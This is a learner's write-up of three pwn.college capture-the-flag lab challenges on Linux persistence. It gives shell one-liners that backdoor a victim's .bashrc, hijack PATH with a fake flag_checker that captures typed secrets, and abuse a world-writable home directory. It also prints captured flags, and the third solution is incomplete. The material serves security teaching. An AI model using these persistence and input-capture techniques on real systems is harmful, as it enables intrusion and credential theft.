# Bashrc Backdoor

When your shell starts up, it looks for `.bashrc` file in your home directory and executes it as a startup script. You can customize your `/home/hacker/.bashrc` with useful things, such as setting environment variables, tweaking your shell configuration, and so on.

You can also use it for evil! An unwitting victim's `.bashrc` is a common target for shenanigans. Imagine sneaking onto your friend's computer and adding a `echo "Hackers were here!"` at the end of their `.bashrc`. That's funny, but the same capability can be used for much more nefarious purposes. Malicious software, for example, often targets startup scripts such as `.bashrc to maintain persistence into the future!

In this challenge, we'll pretend that you've broken into a victim user's machine! That user is named `zardus`, with a home directory of `/home/zardus`. You, as the `hacker` user, have write access to his `.bashrc`, and `zardus` has read-access to `/flag`. The victim is simulated by the script `/challenge/victim`, and you can launch this script at any time to observe the victim logging into the computer. Can you get the flag?

HINT: Like the scripts you explored in `Chaining Commands`, the `.bashrc` script is just a shell script. Adding a new line with a command on it (e.g., `echo Hello Hackers`) will get that command executed, so all you really need to think about is what command will get you the flag!

NOTE: The victim's `/home/zardus/.bashrc` will have a lot of stuff already in it: the shell's startup is a complex affair. Don't panic --- just add your payload to the end and hope for the best!

HINT: Need to poke around as `zardus` to debug your solution? In practice mode, you can use `sudo su --login zardus` to drop into a Zardus session!

## Solution:

- `echo "cat /flag" >> /home/zardus/.bashrc` to add a command to `zardus`'s `.bashrc` that reads the flag.
- `/challenge/victim` prints the flag.

## Flag: 

```
pwn.college{kAWdIC64ndWUTtgKhAZXkwhf122.0VMzEzNxwCO0AzNzEzW}
```

### References:

- none

### Notes:

- `.bashrc` executes automatically when user logs into shell.
- When the shell starts up, it looks for `.bashrc` file in the home directory and executes it as a `startup script`.
- Malicious software, for example, often targets startup scripts such as `.bashrc` to maintain persistence into the future.



# Sniffing Input

In the previous level, you abused Zardus's `~/.bashrc` to make him run commands for you.

This time, Zardus doesn't keep the flag lying around in a readable file after he logs in. Instead he'll run a command named `flag_checker`, manually typing the flag into it for verification.

Your mission is to use your continued write access to Zardus's `.bashrc` to intercept this flag. Remember how you hijacked commands in the `Pondering PATH` module? Can you use that capability to hijack the `flag_checker`?

HINT: Is Zardus getting spooked by your hijack? He's careful --- he checks for the `flag_checker` prompt of `Type the flag`. Make sure your hijack also prints this prompt (e.g., `echo "Type the flag"`). Other than printing that prompt, your fake `flag_checker` can either just a) `cat` Zardus's input to stdout (e.g., `cat with no arguments`) or b) `read` it into a variable and `echo` it out. Up to you!

HINT: Don't forget to make your fake `flag_checker` executable, like you learned in the `Perceiving Permissions` module!

## Solution:

- `echo -e '#!/bin/bash\necho "Type the flag"\ncat' > /home/hacker/flag_checker` to create a fake `flag_checker` that intercepts the input.
- `chmod +x /home/hacker/flag_checker` makes it executable.
- `echo 'export PATH="/home/hacker:$PATH"' >> /home/zardus/.bashrc` add a PATH hijack  to `zardus`'s `.bashrc`.
- `/challenge/victim` gives the flag.

## Flag: 

```
pwn.college{EN1Ws4aqiHcj8jR_RJ5q6rHrJNH.0VNzEzNxwCO0AzNzEzW}
```

### References:

- none

### Notes:

- PATH hijacking can be made persistent by embedding it in startup scripts like `.bashrc`, ensuring the attack survives across multiple login sessions.



# Overshared Directories

Alright, Zardus has wised up --- why would he have a writable `.bashrc`, anyways? But a more common scenario is that users on the same system, to make it easier to collaborate, will make their home directories world writable. What's the problem here?

The problem is that a subtlety of Linux file/directory permissions is that anyone with write access to a directory can move and delete files in it. For example, let's say that Zardus has a world-writable directory for collaboration:

```sh
zardus@dojo:~$ mkdir /tmp/collab
zardus@dojo:~$ chmod a+w /tmp/collab
zardus@dojo:~$ echo "do pwn.college" > /tmp/collab/todo-list
```
And then a hacker comes along and does the following, despite not owning the todo-list file!

```sh
hacker@dojo:~$ ls -l /tmp/collab/todo-list
-rw-r--r-- 1 zardus zardus 15 Jun  6 13:12 /tmp/collab/todo-list
hacker@dojo:~$ rm /tmp/collab/todo-list
rm: remove write-protected regular file '/tmp/collab/todo-list'? y
hacker@dojo:~$ echo "send hacker money" > /tmp/collab/todo-list
hacker@dojo:~$ ls -l /tmp/collab/todo-list
-rw-r--r-- 1 hacker hacker 18 Jun  6 13:12 /tmp/collab/todo-list
hacker@dojo:~$
```
This might seem counterintuitive: `hacker` has no write access to the `todo-list` but the end result is that they can change the content. But think about it this way: a file's connection to a directory lives in the directory in the end, and users with write access to that directory can mess with it. Of course, this has security implications when important directories are world-writable.

In this challenge, for convenience, Zardus opened up his home directory:

```sh
zardus@dojo:~$ chmod a+w /home/zardus
```
As you know, there are lots of sensitive files in that directory such as `.bashrc`! Can you replicate the previous attack with write access to `/home/zardus` instead of `/home/zardus/.bashrc`?

## Solution:

- `echo -e '#!/bin/bash\necho "Type the flag"\nread input\necho "$input" > /home/hacker/stolen_flag\necho "$input"' > /home/hacker/flag_checker && chmod +x /home/hacker/flag_checker` creates a fake `flag_checker` that saves the input.
- `/challenge/victim` prints the flag.

## Flag: 

```
pwn.college{}
```

### References:

- none

### Notes:

Include things you learnt, alternate methods or mistakes you made while solving

